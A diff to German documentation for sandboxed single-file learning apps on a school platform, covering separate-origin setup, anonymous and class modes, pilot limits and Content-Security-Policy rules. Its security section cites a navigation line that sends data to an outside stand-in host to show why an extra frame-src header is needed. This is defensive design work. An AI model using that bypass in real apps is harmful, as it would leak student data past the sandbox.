@@ -4,8 +4,33 @@ Eine HTML-App ist eine einzelne HTML-Datei, die alles mitbringt, zum Beispiel ei
 gebaute Lernapp. Über die hier beschriebene Schnittstelle meldet sie Lernstand, Ergebnisse und
 Liveview ans Klassennotizbuch.
 
-> **Stand:** Die Schnittstelle und `lm-bridge.js` sind festgelegt. Der Modultyp „HTML-App“ ist
-> noch nicht gebaut: Hochladen geht noch nicht, und was unter „Was wo erscheint“ steht, ist der Plan.
+> **Stand:** Pilot, hinter der Freischaltung „HTML-Apps“. Ohne `HTML_APP_ORIGIN` ist sie nicht
+> verfügbar (siehe „Einrichten“). In Chrome geprüft; Safari auf dem iPad steht noch aus.
+
+## Einrichten
+
+Die Apps brauchen eine eigene Adresse auf demselben Server, zum Beispiel
+`lm-apps.schule.de`. Auf der Hauptadresse lägen sie beim Anmelde-Token.
+
+1. DNS und Reverse Proxy: Die neue Adresse zeigt auf denselben Container wie die Hauptadresse.
+2. Im Container `HTML_APP_ORIGIN=https://lm-apps.schule.de` setzen und neu starten.
+3. Administration → Funktionen: „HTML-Apps“ freischalten.
+
+Auf der App-Adresse antwortet der Server nur mit den beiden Rahmen, alles andere ist 404. Auf der
+Hauptadresse gibt es die Rahmen nicht.
+
+Zum Ausprobieren: [`html-app-beispiel.html`](html-app-beispiel.html) als Modul „HTML-App“ hochladen.
+
+## Zwei Wege der Nutzung
+
+| Weg | `init.mode` | Stand | Ergebnisse, Liveview |
+|---|---|---|---|
+| Klassenlink oder Klassennotizbuch (mit Schülerausweis) | `practice` | auf dem Server, je Schüler | ja |
+| Link ohne Klasse, Quick-Link (anonym) | `anonymous` | nur auf dem Gerät | nein |
+| Vorschau der Lehrkraft | `preview` | nichts | nein |
+
+Der anonyme Weg ist abschaltbar: Häkchen „Auch ohne Anmeldung nutzbar“ am Modul (Vorgabe: an).
+Klassenlinks verlangen immer den Ausweis.
 
 ## Ohne Anpassung oder mit Schnittstelle
 
@@ -95,7 +120,7 @@ Ergebnisse bleiben.
 
 | Feld | Bedeutung |
 |---|---|
-| `mode` | `practice` im Durchlauf, `preview` in der Vorschau der Lehrkraft (nichts wird gespeichert), `standalone` ohne Gastgeber |
+| `mode` | `practice` im Durchlauf mit Anmeldung, `anonymous` ohne Anmeldung (Stand nur auf dem Gerät, keine Ergebnisse), `preview` in der Vorschau der Lehrkraft (nichts wird gespeichert), `standalone` ohne Gastgeber |
 | `unit` | Abschnitt, mit dem die App starten soll, oder `null` |
 | `enabledUnits` | Abschnitte, die diese Klasse hat, `null` ohne Einschränkung |
 | `state` | zuletzt gespeicherter Stand oder `null` |
@@ -128,8 +153,12 @@ Ergebnisse bleiben.
 | `kind: info` | zählt beim Ansehen als bearbeitet, ohne Prozent |
 | `LM.saveState` | wieder in `init.state` beim nächsten Start, auch auf einem anderen Gerät |
 
-Stand und Ergebnisse brauchen einen Klassenlink mit Schülerausweis. Über einen Quick-Link ohne
-Klasse bleibt der Stand nur auf dem Gerät.
+Stand und Ergebnisse brauchen einen Klassenlink mit Schülerausweis. Über einen Link ohne Klasse
+bleibt der Stand nur auf dem Gerät.
+
+**Im Pilot noch nicht:** Einzelaufgaben (`items`) werden gespeichert, aber nicht angezeigt.
+Notebook-Export und GitHub-Backup enthalten die HTML-Datei nicht, nur ihre Kennung. `LM.onOpen`
+wird noch nie ausgelöst; den Startabschnitt liefert `init.unit`.
 
 ## Was im Sandkasten geht
 
@@ -213,7 +242,7 @@ Drei Dinge gehören dazu angepasst:
 | Thema | Regel |
 |---|---|
 | Hochladen | Lehrkräfte mit Freischaltung |
-| Shop | gesperrt; ein Admin kann die Sperre aufheben |
+| Shop | ein Angebot lässt HTML-Apps aus; nur ein Admin kann die Sperre am Modul aufheben (`shopAllowed`, noch ohne Oberfläche) |
 | Klassenarbeit | nie über den Link der Klassenarbeit |
 | Netz | kein Zugriff |
 | Untermodule | je Abschnitt ein echtes Untermodul, zugeordnet über `units[].id` |
@@ -244,6 +273,8 @@ Content-Security-Policy: sandbox allow-scripts allow-modals allow-downloads allo
   font-src data:; media-src data: blob:; connect-src 'none'; form-action 'none'; base-uri 'none'
 ```
 
+- Die Hauptseite prüft `event.origin` (App-Adresse) und `event.source`, die Rahmenseite dazwischen
+  leitet nur die festgelegten Nachrichten weiter. Beide Adressen tragen `frame-ancestors`.
 - **Das reicht allein nicht:** `connect-src` hält keinen Seitenwechsel auf. Ohne weiteren Schutz
   sendet `location.href = 'https://fremd/?name=…'` Daten nach außen (in Chrome nachgewiesen). Die Seite
   mit dem iframe muss deshalb `Content-Security-Policy: frame-src 'self'` tragen; damit kam im Test
